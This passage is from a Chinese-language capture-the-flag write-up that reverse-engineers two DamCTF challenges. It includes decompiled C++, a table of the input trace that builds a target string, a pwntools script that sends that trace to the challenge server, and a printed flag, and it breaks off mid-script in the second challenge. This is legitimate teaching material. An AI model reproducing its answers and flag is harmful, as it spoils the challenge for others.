class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n13 == <span class="number">13</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">case13</span>();</span><br><span class="line">      byte5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      n4 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">      <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">case4</span>();</span><br><span class="line">        byte5 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        n5 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">        <span class="keyword">if</span> ( n5 == <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">case5</span>();</span><br><span class="line">          byte5 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          n6 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">          <span class="keyword">if</span> ( n6 == <span class="number">6</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">case6</span>();</span><br><span class="line">            byte5 = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            n7 = <span class="built_in">stoi</span>(</span><br><span class="line">                   (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                   <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                   (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                   <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0xAu</span>);</span><br><span class="line">            <span class="keyword">if</span> ( n7 == <span class="number">7</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">case7</span>();</span><br><span class="line">              byte5 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              n15 = <span class="built_in">stoi</span>(</span><br><span class="line">                      (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                      <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                      (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                      <span class="number">0</span>,</span><br><span class="line">                      <span class="number">0xAu</span>);</span><br><span class="line">              <span class="keyword">if</span> ( n15 == <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">case15</span>();</span><br><span class="line">                byte5 = <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                n9 = <span class="built_in">stoi</span>(</span><br><span class="line">                       (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                       <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                       (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="number">0xAu</span>);</span><br><span class="line">                <span class="keyword">if</span> ( n9 == <span class="number">9</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">case9</span>();</span><br><span class="line">                  byte5 = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  n10 = <span class="built_in">stoi</span>(</span><br><span class="line">                          (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                          <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                          (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                          <span class="number">0</span>,</span><br><span class="line">                          <span class="number">0xAu</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( n10 == <span class="number">10</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">case10</span>();</span><br><span class="line">                    byte5 = <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    byte5 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( s1[<span class="number">1</span>] == (<span class="type">void</span> *)<span class="number">8</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v16 = (<span class="type">int</span>)s1[<span class="number">0</span>];</span><br><span class="line">                      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s1[<span class="number">0</span>], <span class="string">&quot;00111111&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="built_in">casedef</span>(v16, (<span class="type">int</span>)<span class="string">&quot;00111111&quot;</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                      byte5 = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  p_x4 = &amp;x4;</span><br><span class="line">  v37[<span class="number">0</span>] = &amp;x5;</span><br><span class="line">  x1 = (<span class="type">char</span> *)&amp;x5 - <span class="number">40</span>;</span><br><span class="line">  v32[<span class="number">0</span>] = &amp;x7;</span><br><span class="line">  <span class="keyword">if</span> ( v35 != v36 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35, v36[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  v32[<span class="number">0</span>] = &amp;x6;</span><br><span class="line">  std::locale::~<span class="built_in">locale</span>((std::locale *)v33);</span><br><span class="line">  p_x4 = (_QWORD *)p__ZSt3cin_0;</span><br><span class="line">  *(_QWORD **)((<span class="type">char</span> *)&amp;p_x4 + *(_QWORD *)(p__ZSt3cin_0 - <span class="number">24LL</span>)) = (_QWORD *)x3;</span><br><span class="line">  x1 = (<span class="type">char</span> *)::x1;</span><br><span class="line">  *(_QWORD *)((<span class="type">char</span> *)&amp;v32[<span class="number">-1</span>] + *(_QWORD *)(::x1 - <span class="number">24LL</span>)) = x2;</span><br><span class="line">  p_x4 = (_QWORD *)p__ZSt3cin;</span><br><span class="line">  *(_QWORD **)((<span class="type">char</span> *)&amp;p_x4 + *(_QWORD *)(p__ZSt3cin - <span class="number">24LL</span>)) = (_QWORD *)x0;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v37[<span class="number">0</span>] = &amp;x8;</span><br><span class="line">  std::ios_base::~<span class="built_in">ios_base</span>((std::ios_base *)v37);</span><br><span class="line">  <span class="keyword">if</span> ( v26 != v28 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v26, v28[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( s1_1[<span class="number">0</span>] != v25 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(s1_1[<span class="number">0</span>], v25[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( s1[<span class="number">0</span>] != v23 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(s1[<span class="number">0</span>], v23[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( p_n10_1[<span class="number">0</span>] != v21 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(p_n10_1[<span class="number">0</span>], v21[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( p_n10 != v19 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(p_n10, v19[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> byte5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现是一个输入逻辑分发函数，先初始化了两个量，打印“&gt;”后读取输入，将其转换为整数，按4、5、6、7、9、10、11、13、15和00111111分配不同作用的函数，其中00111111是查看当前产生的字节，发现有：</p>
<table>
<thead>
<tr>
<th><strong>输入值&#x2F;控制函数</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>写入字符“f”</td>
</tr>
<tr>
<td>5</td>
<td>对最后一个字符-1</td>
</tr>
<tr>
<td>6</td>
<td>对最后一个字符+3</td>
</tr>
<tr>
<td>7</td>
<td>写入字符“a”</td>
</tr>
<tr>
<td>9</td>
<td>写入字符“z”</td>
</tr>
<tr>
<td>10</td>
<td>写入字符“m”</td>
</tr>
<tr>
<td>11</td>
<td>将最后一个字符改为“t”</td>
</tr>
<tr>
<td>13</td>
<td>删除最后一个字符</td>
</tr>
<tr>
<td>15</td>
<td>写入字符“r”</td>
</tr>
<tr>
<td>第8步（func1）</td>
<td>写入字符“g”</td>
</tr>
</tbody></table>
<p>由于要构造的字符串为<code>inagalaxyfarfaraway</code>，所以应该输入的trace为：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>字节码</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>4</td>
<td>f</td>
</tr>
<tr>
<td>2</td>
<td>6</td>
<td>i</td>
</tr>
<tr>
<td>3</td>
<td>10</td>
<td>im</td>
</tr>
<tr>
<td>4</td>
<td>6</td>
<td>ip</td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td>io</td>
</tr>
<tr>
<td>6</td>
<td>5</td>
<td>in</td>
</tr>
<tr>
<td>7</td>
<td>7</td>
<td>ina</td>
</tr>
<tr>
<td>8</td>
<td>func1</td>
<td>inag</td>
</tr>
<tr>
<td>9</td>
<td>7</td>
<td>inaga</td>
</tr>
<tr>
<td>10</td>
<td>10</td>
<td>inagam</td>
</tr>
<tr>
<td>11</td>
<td>5</td>
<td>inagal</td>
</tr>
<tr>
<td>12</td>
<td>7</td>
<td>inagala</td>
</tr>
<tr>
<td>13</td>
<td>9</td>
<td>inagalaz</td>
</tr>
<tr>
<td>14</td>
<td>5</td>
<td>inagalay</td>
</tr>
<tr>
<td>15</td>
<td>5</td>
<td>inagalax</td>
</tr>
<tr>
<td>16</td>
<td>9</td>
<td>inagalaxz</td>
</tr>
<tr>
<td>17</td>
<td>5</td>
<td>inagalaxy</td>
</tr>
<tr>
<td>18</td>
<td>4</td>
<td>inagalaxyf</td>
</tr>
<tr>
<td>19</td>
<td>7</td>
<td>inagalaxyfa</td>
</tr>
<tr>
<td>20</td>
<td>15</td>
<td>inagalaxyfar</td>
</tr>
<tr>
<td>21</td>
<td>4</td>
<td>inagalaxyfarf</td>
</tr>
<tr>
<td>22</td>
<td>7</td>
<td>inagalaxyfarfa</td>
</tr>
<tr>
<td>23</td>
<td>15</td>
<td>inagalaxyfarfar</td>
</tr>
<tr>
<td>24</td>
<td>7</td>
<td>inagalaxyfarfara</td>
</tr>
<tr>
<td>25</td>
<td>15</td>
<td>inagalaxyfarfarar</td>
</tr>
<tr>
<td>26</td>
<td>6</td>
<td>inagalaxyfarfarau</td>
</tr>
<tr>
<td>27</td>
<td>6</td>
<td>inagalaxyfarfarax</td>
</tr>
<tr>
<td>28</td>
<td>5</td>
<td>inagalaxyfarfaraw</td>
</tr>
<tr>
<td>29</td>
<td>7</td>
<td>inagalaxyfarfarawa</td>
</tr>
<tr>
<td>30</td>
<td>9</td>
<td>inagalaxyfarfarawaz</td>
</tr>
<tr>
<td>31</td>
<td>5</td>
<td>inagalaxyfarfaraway</td>
</tr>
</tbody></table>
<p>综上，编写pwntools脚本和服务器交互：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;isitdata.chals.damctf.xyz&quot;</span></span><br><span class="line">port = <span class="number">39531</span></span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;4&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;10&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;10&quot;</span>, <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;15&quot;</span>, <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>, <span class="string">&quot;15&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;15&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;5&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn = remote(host, port)</span><br><span class="line"></span><br><span class="line">initial = conn.recvuntil(<span class="string">b&quot;&gt;&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="comment"># print(initial.decode())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, payload <span class="keyword">in</span> <span class="built_in">enumerate</span>(payloads):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Sending: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    conn.sendline(payload.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(payloads) - <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#print(&quot;[+] Waiting for &#x27;&gt;&#x27; prompt...&quot;)</span></span><br><span class="line">        response = conn.recvuntil(<span class="string">b&quot;&gt;&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final_output = conn.recvall(timeout=<span class="number">5</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] Final output: &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(final_output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p>flag：<font color=deepskyblue><strong>dam{I_dont_like_silicon_it_makes_cpus_and_theyre_everywhere}</strong></font>.</p>
<h1 id="It’s-data-not-data"><a href="#It’s-data-not-data" class="headerlink" title="It’s data, not data."></a>It’s data, not data.</h1><p>和上一题差不多，查看init：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cipher = (__int64)algn_72D0;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(&amp;cipher, <span class="string">&quot;episode3,57min34sec&quot;</span>, (__int64)<span class="string">&quot;&quot;</span>);</span><br><span class="line">  __cxa_atexit((<span class="built_in">void</span> (*)(<span class="type">void</span> *))&amp;std::string::~string, &amp;cipher, &amp;dso_handle);</span><br><span class="line">  obj__0 = (__int64)&amp;qword_72B0;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(&amp;obj__0, <span class="string">&quot;&quot;</span>, (__int64)<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit((<span class="built_in">void</span> (*)(<span class="type">void</span> *))&amp;std::string::~string, &amp;obj__0, &amp;dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次要构造的输入是<code>episode3,57min34sec</code>，查看main：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">func1</span>(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">calls</span>();</span><br><span class="line">      <span class="built_in">checkturns</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">getinput</span>() );</span><br><span class="line">    <span class="built_in">LODWORD</span>(turns) = turns + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">check</span>() )</span><br><span class="line">      <span class="built_in">giveflag</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>func1应该是某种初始化，运行程序进行测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Move Number: 1 of 100</span><br><span class="line">Target : episode3,57min34sec</span><br><span class="line">Current: 5&amp;ro4Cw&#125;N)ZFhBQN&lt;~2</span><br></pre></td></tr></table></figure>

<p>发现第一次输入的内容会按某种方式生成一个看似随机的字符串，之后需要在这个字符串上做修改，查看func1：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> n32; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> valEv; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n15; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// bp</span></span><br><span class="line">  __int64 v9; <span class="comment">// r9</span></span><br><span class="line">  __int64 n15_2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n15_1; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+0h] [rbp-13F8h] BYREF</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+8h] [rbp-13F0h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v18[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-13E8h] BYREF</span></span><br><span class="line">  _QWORD v19[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-13D8h] BYREF</span></span><br><span class="line">  _QWORD v20[<span class="number">115</span>]; <span class="comment">// [rsp+30h] [rbp-13C8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v21; <span class="comment">// [rsp+13B8h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v21 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v18[<span class="number">0</span>] = v19;</span><br><span class="line">  v18[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v19[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v0 = *(_QWORD *)(std::cin[<span class="number">0</span>] - <span class="number">24</span>);</span><br><span class="line">  v1 = *(_BYTE **)((<span class="type">char</span> *)&amp;std::cin[<span class="number">30</span>] + v0);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    std::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v1[<span class="number">56</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    n32 = v1[<span class="number">67</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(__int64 *)((<span class="type">char</span> *)&amp;std::cin[<span class="number">30</span>] + v0));</span><br><span class="line">    n32 = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v1 + <span class="number">48LL</span>))(v1, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::getline&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(std::cin, v18, (<span class="type">unsigned</span> <span class="type">int</span>)n32);</span><br><span class="line">  v3 = qword_72C8;</span><br><span class="line">  v4 = qword_72C8;</span><br><span class="line">  valEv = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)v18[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">  <span class="built_in">calc1</span>(v20, valEv);</span><br><span class="line">  v16 = <span class="number">0x7E00000021LL</span>;</span><br><span class="line">  <span class="built_in">LODWORD</span>(v17) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">HIDWORD</span>(v17) = qword_72C8 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="built_in">calc4</span>((__int64)&amp;v16, (__int64)v20, (<span class="type">int</span> *)&amp;v16);</span><br><span class="line">      n15_2 = n15_0;</span><br><span class="line">      n15_1 = n15_0 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (__int64 *)obj__0 == &amp;::n15 )</span><br><span class="line">        n15 = <span class="number">15</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        n15 = ::n15;</span><br><span class="line">      <span class="keyword">if</span> ( n15 &lt; n15_1 )</span><br><span class="line">        std::string::_M_mutate(&amp;obj__0, n15_0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, v9, v16, v17);</span><br><span class="line">      *(_BYTE *)(obj__0 + n15_2) = v8;</span><br><span class="line">      n15_0 = n15_1;</span><br><span class="line">      *(_BYTE *)(obj__0 + n15_2 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 != v6 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)v18[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0xAu</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v14 % <span class="number">5</span> &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = <span class="built_in">calc4</span>((__int64)&amp;v17, (__int64)v20, (<span class="type">int</span> *)&amp;v17);</span><br><span class="line">    *(_BYTE *)(obj__0 + v13) = *(_BYTE *)(obj_ + v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18[<span class="number">0</span>] != v19 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v18[<span class="number">0</span>], v19[<span class="number">0</span>] + <span class="number">1LL</span>)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> v21 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现func1是需要用户提供随机数种子，然后用mt19937算法变体生成一个19字节的随机字符串，编写脚本提取0~20万的返回值，评估出最优字符串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 